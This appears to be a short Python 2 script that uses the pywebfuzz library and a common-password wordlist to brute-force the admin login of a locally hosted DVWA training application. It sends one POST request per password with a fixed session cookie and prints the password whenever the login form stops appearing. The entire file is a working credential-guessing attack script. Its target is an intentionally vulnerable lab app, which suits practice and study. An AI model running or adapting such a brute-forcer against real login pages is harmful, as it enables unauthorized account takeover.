from pywebfuzz import utils, fuzzdb

location = "http://127.0.0.1/DVWA-1.0.8/login.php"

request_headers = {"Host": "foo.com",
                   "User-Agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Firefox/3.6.3",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "en-us,en;q=0.5",
                   "Keep-Alive": "115",
                   "Connection": "keep-alive",
                   "Referer": "http://foo.com",
                   "Cookie": "security=high; PHPSESSID=00885b45d9ddda3e757371b177c5959b"}

pwd_list= fuzzdb.wordlists_user_passwd.passwds.twitter
for pwd in pwd_list:
  postdata="username=admin&password="+pwd+"&Login=Login"
  headers, content, code, time  = utils.make_request(location, method="POST", postdata=postdata, headers=request_headers)
  if (content.find("<form action=\"login.php\" method=\"post\">") == -1): print "Password that worked:", pwd

